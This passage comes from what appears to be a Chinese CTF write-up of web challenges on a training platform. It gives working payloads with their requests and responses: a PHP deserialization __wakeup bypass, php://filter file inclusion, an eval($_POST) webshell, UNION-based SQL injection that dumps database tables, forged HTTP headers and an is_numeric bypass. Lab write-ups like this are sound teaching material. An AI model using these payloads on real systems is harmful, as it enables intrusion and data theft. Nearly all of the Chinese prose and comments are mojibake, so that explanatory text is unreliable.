&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  <span class="comment"># æ˜æ˜¾è·å– flag</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé™„ä¸Šå¤§ä½¬åšå®¢ <a target="_blank" rel="noopener" href='https://www.cnblogs.com/Mrsm1th/p/6835592.html' style='text-decoration:none'>phpååºåˆ—åŒ–æ¼æ´ç»•è¿‡é­”æœ¯æ–¹æ³• __wakeup</a></p>
<p>æœ‰ä¸€ä¸ªå¾ˆéœ€è¦æ³¨æ„çš„ç‚¹ï¼Œå°±æ˜¯ private ç§æœ‰å˜é‡åºåˆ—åŒ–ä¹‹åçš„æ ¼å¼æ˜¯ä¸ä¸€æ ·æ»´ï¼Œç„¶åè¦ç»•è¿‡ __wakeup() çš„è¯ï¼Œ**å½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç›®æ—¶å¯ç»•è¿‡wakeupæ–¹æ³•(CVE-2016-7124)**ï¼Œæ‰€ä»¥åœ¨åŸæ¥çš„åŸºç¡€ 2 ä¸ŠåŠ  1 å³å¯</p>
<p>æ„é€  payloadï¼š <code>?select=O:4:"Name":3:&#123;s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;&#125;</code></p>
<p>æœ€åçˆ†å‡º flag ğŸ˜„</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;eabdf796-f1f1-4505-8c81-6b509a640cc5&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x03-Secret-File"><a href="#0x03-Secret-File" class="headerlink" title="0x03 Secret File"></a>0x03 Secret File</h1><h2 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h2><p><strong>è€ƒå¯Ÿé¡¹ï¼š</strong> æŠ“åŒ…  |  LFIæœ¬åœ°æ–‡ä»¶åŒ…å«</p>
<p><strong>å‚è€ƒé¡¹ï¼š</strong> <a target="_blank" rel="noopener" href='https://www.cnblogs.com/wh4am1/p/6542398.html' style='text-decoration:none'>LFIæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´</a></p>
<h2 id="WriteUp-3"><a href="#WriteUp-3" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>é¦–å…ˆæŸ¥çœ‹æºä»£ç ï¼Œè¿›å…¥ä¸€ä¸ªæ–°çš„ç½‘é¡µï¼Œç„¶åç‚¹å‡»æŒ‰é’®è¿›å…¥äº†æ–°çš„ç½‘é¡µï¼Œå‘Šè¯‰æˆ‘ä»¬å·²ç»è¿‡å»äº†</p>
<p>ç›´æ¥æŠ“åŒ…å‘—ğŸ‘Œ ï¼ˆPSï¼šæŸ æª¬å¤§ä½¬å’Œæˆ‘çš„è¿™ä¸€æ­¥æœ‰åŒºåˆ«ï¼Œæ­¤å¤„é™„ä¸Šä»–çš„è§£æ³•ï¼š<a target="_blank" rel="noopener" href='https://lemonprefect.cn/2020/02/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-WriteUp/' style='text-decoration:none'>æŸ æª¬çš„é¢˜è§£</a>ï¼‰</p>
<h5 id="è¯·æ±‚ï¼š"><a href="#è¯·æ±‚ï¼š" class="headerlink" title="è¯·æ±‚ï¼š"></a>è¯·æ±‚ï¼š</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/action.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1f08ab14-6edd-42c2-b110-b5c11f207774.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://1f08ab14-6edd-42c2-b110-b5c11f207774.node3.buuoj.cn/Archive_room.php</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>

<h5 id="å“åº”ï¼š"><a href="#å“åº”ï¼š" class="headerlink" title="å“åº”ï¼š"></a>å“åº”ï¼š</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sat, 29 Feb 2020 13:05:52 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>63</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>end.php</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.3.11</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">   secr3t.php        </span><br><span class="line">--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›å…¥ secr3t.phpï¼Œå‡ºç°ä»£ç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flagæ”¾åœ¨äº†flag.phpé‡Œ</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>å‘Šè¯‰æˆ‘ä»¬ flag åœ¨ flag.php é‡Œé¢ï¼Œç„¶åä¸€å»ï¼Œå•¥éƒ½è«å¾—ï¼Œemmç›´æ¥ç”¨æ–‡ä»¶åŒ…å«ï¼ˆè§å‚è€ƒé¡¹ï¼‰</p>
<p>æ„é€  payloadï¼š <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>ç„¶åå¾—åˆ° Base64 ç¼–ç çš„ flag.php æºä»£ç </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MjgzNDNjMmUtYWIwMC00MmFkLThjNGQtYmM0ZjY3M2M0Mjk1fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure>

<p>ç„¶å Base64 è§£ç ï¼Œç•¥ç•¥ç•¥ğŸ˜‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;å•Šå“ˆï¼ä½ æ‰¾åˆ°æˆ‘äº†ï¼å¯æ˜¯ä½ çœ‹ä¸åˆ°æˆ‘QAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;æˆ‘å°±åœ¨è¿™é‡Œ&quot;;</span><br><span class="line">                $flag &#x3D; &#39;flag&#123;28343c2e-ab00-42ad-8c4d-bc4f673c4295&#125;&#39;;</span><br><span class="line">                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å½“å½“å½“ï¼Œå¾—åˆ° flag  ğŸ˜</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;28343c2e-ab00-42ad-8c4d-bc4f673c4295&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x04-Knife"><a href="#0x04-Knife" class="headerlink" title="0x04 Knife"></a>0x04 Knife</h1><h2 id="Analysis-4"><a href="#Analysis-4" class="headerlink" title="Analysis"></a>Analysis</h2><p><strong>è€ƒå¯Ÿé¡¹ï¼š</strong> ä¸€å¥è¯æœ¨é©¬</p>
<p><strong>å‚è€ƒé¡¹ï¼š</strong> <a target="_blank" rel="noopener" href='https://blog.csdn.net/weixin_39190897/article/details/86772765' style='text-decoration:none'>Webå®‰å…¨ â€“ ä¸€å¥è¯æœ¨é©¬</a>  |  <a target="_blank" rel="noopener" href='https://cloud.tencent.com/developer/news/319874' style='text-decoration:none'>ä¸­å›½èœåˆ€ä½¿ç”¨æŒ‡å—</a></p>
<h2 id="WriteUp-4"><a href="#WriteUp-4" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>è¿™é¢˜â€¦â€¦ä¸€å¼€å§‹ç›´æ¥æŠŠ webshell ä¸¢äº†å‡ºæ¥å—·ï¼Œè¿˜æ€•åˆ«äººä¸çŸ¥é“è¦ç”¨èœåˆ€ï¼Œç‰¹æ„åšäº†æç¤º</p>
<p>webshellï¼š<code>eval($_POST["Syc"]);</code></p>
<p>ç›´æ¥æ‰“å¼€èœåˆ€è¿ä¸Š key ï¼Œæ‰¾äº†ä¸€ä¸‹å‘ç°äº†å­˜æ”¾ flag çš„æ–‡ä»¶ï¼ˆso easy~ï¼‰</p>
<p>å¾—åˆ°flag ğŸ˜„</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;29a9d621-9f53-4dfe-b65c-26b9da437d70&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x05-LoveSQL"><a href="#0x05-LoveSQL" class="headerlink" title="0x05 LoveSQL"></a>0x05 LoveSQL</h1><h2 id="Analysis-5"><a href="#Analysis-5" class="headerlink" title="Analysis"></a>Analysis</h2><p><strong>è€ƒå¯Ÿé¡¹ï¼š</strong> SQLæ³¨å…¥ â€” è”åˆæŸ¥è¯¢</p>
<p><strong>å‚è€ƒé¡¹ï¼š</strong> <a target="_blank" rel="noopener" href='https://blog.csdn.net/weixin_42277564/article/details/80583959' style='text-decoration:none'>SQLæ³¨å…¥ä¹‹è”åˆæŸ¥è¯¢æ³¨å…¥</a></p>
<h2 id="WriteUp-5"><a href="#WriteUp-5" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>æ‰“å¼€ç½‘é¡µï¼Œé¦–å…ˆç”¨æˆ·åç›´æ¥è¾“å…¥ <code>' or 1 = 1 #</code>ï¼Œå¯†ç éšä¾¿è¾“äº†ä¸ªï¼Œå¾—åˆ°äº†ä¸€ä¸ªæ˜¾ç„¶æ²¡æœ‰ä»»ä½•ç”¨çš„ç½‘é¡µ</p>
<p>äºæ˜¯é€€å›æ„é€  payloadï¼š <code>?username='order by 4 %23&password=a</code>ï¼Œå¾—åˆ°æœŸæœ›çš„è¿”å›ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>

<p>æ˜¾ç„¶åˆ—æ•°ä¸º 3ï¼Œæ¥ä¸‹æ¥çˆ†åº“</p>
<p>æ„é€  payloadï¼š <code>?username=1' union select 1,2,group_concat(schema_name) from information_schema.schemata %23 &password=a</code></p>
<p>æˆåŠŸçˆ†å‡ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello 2ï¼</span><br><span class="line">Your password is &#x27;information_schema,test,performance_schema,mysql,geek&#x27;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›è¡Œçˆ†è¡¨ğŸ·</p>
<p>æ„é€  payloadï¼š <code>?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23 &password=a</code></p>
<p>æˆåŠŸçˆ†å‡ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello 2ï¼</span><br><span class="line">Your password is &#x27;geekuser,l0ve1ysq1&#x27;</span><br></pre></td></tr></table></figure>

<p>æœ€åçˆ†åˆ—ğŸ™ƒ</p>
<p>æ„é€  payloadï¼š <code>?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() %23 &password=a</code></p>
<p>æˆåŠŸçˆ†å‡ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello 2ï¼</span><br><span class="line">Your password is &#x27;id,username,password,id,username,password&#x27;</span><br></pre></td></tr></table></figure>

<p>çŒœæµ‹æ˜¯åœ¨ password ä¸­ï¼Œæ„é€  payloadï¼š <code>?username=1' union select 1,2,group_concat(password) from l0ve1ysq1 %23 &password=a</code></p>
<p>æˆåŠŸçˆ†å‡º flagï¼Œo((&gt;Ï‰&lt; ))o</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d33d782a-ecd5-4175-801a-f5389f9ba636&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x06-Http"><a href="#0x06-Http" class="headerlink" title="0x06 Http"></a>0x06 Http</h1><h2 id="Analysis-6"><a href="#Analysis-6" class="headerlink" title="Analysis"></a>Analysis</h2><p>è€ƒå¯Ÿé¡¹ï¼š Httpè¯·æ±‚å¤´</p>
<h2 id="WriteUp-6"><a href="#WriteUp-6" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>è¿™ä¸€é¢˜ä¸€å¼€å§‹ä¹Ÿä¸æ˜¯å¾ˆæ‡‚å…¶å®â€¦â€¦è¿˜æ˜¯è¦æ„Ÿè°¢æŸ æª¬çš„å¸®åŠ©ï¼Œæˆ‘ä¸€å¼€å§‹æ˜¯ç”¨ BP æŠ“åŒ…ï¼Œç„¶åä¸€ç›´åšä¸å‡ºï¼Œç„¶åæŸ æª¬æç¤ºäº†å¯ä»¥ç›´æ¥â€¦â€¦åœ¨é¡µé¢ä¸Šä¿®æ”¹ğŸ˜‚</p>
<p>é‚£å°±æ²¡å•¥é—®é¢˜äº†ğŸ˜‚ï¼Œé¦–å…ˆæ‰“å¼€ç½‘é¡µï¼ˆé¡µé¢åšçš„å¾ˆä¸é”™ï¼Œæœ‰ç‚¹æƒ³ç›—èµ°ğŸ˜ï¼‰ï¼Œç„¶åç›´æ¥å®¡æŸ¥æºä»£ç ï¼Œå‘ç°äº† <code>Secret.php</code>ï¼Œç›´æ¥è·Ÿè¿›ï¼Œé¡µé¢æ˜¾ç¤ºå‡ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">It doesn&#x27;t come from &#x27;https://www.Sycsecret.com&#x27;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æ·»åŠ è¯·æ±‚å¤´ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://www.Sycsecret.com</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¾—åˆ°é¡µé¢æ˜¾ç¤ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please use &quot;Syclover&quot; browser</span><br></pre></td></tr></table></figure>

<p>å³æ·»åŠ è¯·æ±‚å¤´ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Syclover</span><br></pre></td></tr></table></figure>

<p>å†ç„¶åå¾—åˆ°é¡µé¢æ˜¾ç¤ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No!!! you can only read this locally!!!</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾ï¼Œå†æ¬¡æ·»åŠ è¯·æ±‚å¤´ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure>

<p>æœ€åå¾—åˆ° flag ğŸ˜„</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;38e90db9-b4be-49ee-bf4a-7c983d3c51a7&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x07-BuyFlag"><a href="#0x07-BuyFlag" class="headerlink" title="0x07 BuyFlag"></a>0x07 BuyFlag</h1><h2 id="Analysis-7"><a href="#Analysis-7" class="headerlink" title="Analysis"></a>Analysis</h2><p><strong>è€ƒå¯Ÿé¡¹ï¼š</strong> ä»£ç å®¡è®¡  |  PHP  |  HTTPè¯·æ±‚å¤´</p>
<p><strong>å‚è€ƒé¡¹ï¼š</strong> <a target="_blank" rel="noopener" href='https://www.cnblogs.com/xhds/p/12312223.html' style='text-decoration: none'>is_numeric()å‡½æ•°å®‰å…¨æ¼æ´</a></p>
<h2 id="WriteUp-7"><a href="#WriteUp-7" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>è¿›å…¥ç½‘é¡µï¼Œå‘ç°äº† pay.php ç½‘é¡µï¼Œè¿›å…¥çœ‹åˆ°æ ‡è¯­ï¼š ğŸ‘</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag need your 100000000 money</span><br></pre></td></tr></table></figure>

<p>è¿˜æŒºé»‘å¿ƒâ€¦â€¦ç„¶åæ¥ä¸‹æ¥çœ‹åˆ° <code>ATTENTION</code>ï¼Œå‘ç°äº†æç¤ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">If you want to buy the FLAG:</span><br><span class="line">You must be a student from CUIT!!!</span><br><span class="line">You must be answer the correct password!!! </span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸‹é¢è¿˜æœ‰ä¸€æ®µè¯ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Only Cuit&#x27;s students can buy the FLAG</span><br></pre></td></tr></table></figure>

<p>æ„æ€æ˜¯åªæœ‰ Cuit çš„å­¦ç”Ÿæ‰å¯ä»¥ä¹°ï¼ˆï¼Ÿã€‚ï¼Ÿï¼‰ï¼Œæ²¡å¤§é—®é¢˜ï¼Œå…ˆæ”¾ç€ğŸ˜•</p>
<p>å†ç„¶åæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°äº†ä»¥ä¸‹è¢«æ³¨é‡Šæ‰çš„ php ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">	~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;  <span class="comment">// åˆ¤æ–­ post ä¼ æ¥çš„ password æ˜¯å¦ä¸ºç©º</span></span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];  <span class="comment">// å°† post ä¼ æ¥çš„ password èµ‹å€¼ç»™ $password</span></span><br><span class="line">	<span class="keyword">if</span> (is_numeric(<span class="variable">$password</span>)) &#123;  <span class="comment">// is_numeric åˆ¤æ–­ password æ˜¯å¦ä¸ºæ•°å­—æˆ–è€…æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueï¼Œè¾“å‡ºé”™è¯¯</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;  <span class="comment">// å½“ password ä¸º 404 æ—¶ï¼Œè¿”å›æ­£ç¡®</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹ php ä»£ç è¿›è¡Œåˆ†æï¼Œè¦æ»¡è¶³ post ä¼ å…¥çš„ password ä¸º 404 çš„æ—¶å€™ï¼Œæ‰å¯ä»¥è´­ä¹° <abbr title='å»ä½ ä¸«çš„ï¼Œè¿˜è´­ä¹°'><code>flag</code></abbr> ï¼Œå¹¶ä¸”æ ¹æ®æ ‡è¯­ï¼Œæˆ‘ä»¬è¦<s>æ”¯ä»˜</s> 100000000 moneyï¼Œå…¶å®æ„æ€å°±æ˜¯ post ä¼ å…¥çš„ money è¦ä¸º 100000000ï¼Œç„¶åè¿™ä¸ªæ—¶å€™å‡ºç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ is_numeric è¿™ä¸ªåœ°æ–¹ï¼Œå¦‚æœå•å•ä¼ å…¥ password=404 çš„è¯ï¼Œ if ä¼šç›´æ¥åˆ¤æ–­æ­£ç¡®è¾“å‡ºé”™è¯¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è€ƒè™‘ç»•è¿‡ï¼Œåœ¨åé¢åŠ ä¸€ä¸ªç©ºæ ¼å°±å¯ä»¥å•¦ï¼ˆå‚è€ƒ is_numeric()å‡½æ•°å®‰å…¨æ¼æ´ï¼‰ğŸ˜¬</p>
<p>æ£€æŸ¥ Httpè¯·æ±‚å¤´ï¼Œå‘ç°äº† <code>cookie: user=0</code>ï¼Œè”æƒ³åˆ°ä¹‹å‰çœ‹åˆ°çš„<code>Only Cuit's students can buy the FLAG</code>ï¼Œå¯»æ€ç€å¤§æ¦‚æ˜¯ä¿®æ”¹è¿™é‡Œï¼Œåœ¨ç«ç‹ hackbar å°†å…¶ä¿®æ”¹ä¸º <code>cookie: user=1</code>ï¼Œç„¶åæäº¤ï¼Œæ˜¾ç¤ºå‡ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">you are Cuiter</span><br><span class="line">Please input your password!! </span><br></pre></td></tr></table></figure>

<p>éªŒè¯çŒœæƒ³æ­£ç¡®ï¼Œå””â€¦â€¦åœ¨ç½‘ä¸Šçœ‹åˆ°åˆ«çš„å¤§ç¥éƒ½æ˜¯ä¸€çœ¼å°±å¯ä»¥çœ‹å‡ºæ¥çš„â€¦â€¦æˆ‘å¤ªèœäº†ğŸ˜µ</p>
<p>ç„¶åå°±å¯ä»¥åœ¨ hackbar æ·»åŠ  post æäº¤ï¼š</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=404%20&amp;money=100000000</span><br></pre></td></tr></table></figure>

<p>ç„¶åï¼å±…ç„¶â€¦â€¦ç»™æˆ‘å¼¹å‡ºäº†è¿™ä¸ªâ€¦â€¦ğŸ˜µ</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">you are Cuiter</span><br><span class="line">Password Right!</span><br><span class="line">Nember lenth is too long</span><br></pre></td></tr></table></figure>

<p>å¯†ç çš„ç¡®æ­£ç¡®äº†ï¼Œä½†æ˜¯è¯´æˆ‘çš„ money å¤ªé•¿äº†ï¼Œå””â€¦â€¦äºæ˜¯è€ƒè™‘äº†ç§‘å­¦è®¡æ•°æ³•ï¼Œé‡æ–°å¡«å†™ post ï¼š</p>
